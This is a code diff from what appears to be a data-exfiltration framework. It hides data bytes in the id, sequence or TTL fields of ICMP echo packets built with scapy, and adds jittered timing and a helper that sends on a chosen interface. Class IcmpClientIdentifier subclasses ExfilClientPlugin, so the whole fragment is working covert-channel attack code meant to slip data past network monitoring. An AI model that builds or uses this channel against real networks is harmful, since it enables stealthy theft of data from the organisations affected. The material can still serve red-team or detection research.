@@ -1,4 +1,3 @@
-
 from __future__ import annotations
 from typing import Dict, Any, Iterable, Optional
 import time, random
@@ -12,31 +11,49 @@ def _sleep_rhythm(base_ms: int, disp_ms: int) -> None:
         t = max(0.0, (base_ms + jitter) / 1000.0)
         time.sleep(t)
 
+def _send_packet(pkt, iface: Optional[str] = None):
+    from scapy.all import send, sendp, Ether, conf, getmacbyip
+    if not iface:
+        send(pkt, verbose=False)
+        return
+
+    old_iface = conf.iface
+    try:
+        conf.iface = iface
+        mac = getmacbyip(pkt.dst)
+    finally:
+        conf.iface = old_iface
+
+    if not mac:
+        raise RuntimeError(f"no se pudo resolver MAC para destino {pkt.dst!r} en iface {iface!r}")
+    sendp(Ether(dst=mac) / pkt, verbose=False, iface=iface)
+
+
 def _send_symbol_identifier(dst: str, b: int, iface: Optional[str] = None, ttl_base: Optional[int] = None):
-    from scapy.all import IP, ICMP, send, RandShort
+    from scapy.all import IP, ICMP, RandShort
     ip = IP(dst=dst)
     if ttl_base is not None:
         ip.ttl = (int(ttl_base) + (b & 0xFF)) & 0xFF or 1
     ic = ICMP(type=8)  # echo-request
     ic.id = (b & 0xFF) | ((RandShort() & 0xFF) << 8)
     ic.seq = RandShort()
-    send(ip / ic, verbose=False, iface=iface)
+    _send_packet(ip / ic, iface=iface)
 
 def _send_symbol_sequence(dst: str, b: int, iface: Optional[str] = None, ttl_base: Optional[int] = None):
-    from scapy.all import IP, ICMP, send, RandShort
+    from scapy.all import IP, ICMP, RandShort
     ip = IP(dst=dst)
     if ttl_base is not None:
         ip.ttl = (int(ttl_base) + (b & 0xFF)) & 0xFF or 1
     ic = ICMP(type=8)
     ic.id = RandShort()
     ic.seq = (b & 0xFF) | ((RandShort() & 0xFF) << 8)
-    send(ip / ic, verbose=False, iface=iface)
+    _send_packet(ip / ic, iface=iface)
 
 def _send_symbol_ttl(dst: str, b: int, iface: Optional[str] = None, ttl_base: int = 64):
-    from scapy.all import IP, ICMP, send, RandShort
+    from scapy.all import IP, ICMP, RandShort
     ip = IP(dst=dst, ttl=((int(ttl_base) + (b & 0xFF)) & 0xFF) or 1)
     ic = ICMP(type=8, id=RandShort(), seq=RandShort())
-    send(ip / ic, verbose=False, iface=iface)
+    _send_packet(ip / ic, iface=iface)
 
 class IcmpClientIdentifier(ExfilClientPlugin):
     canal = "ICMP"
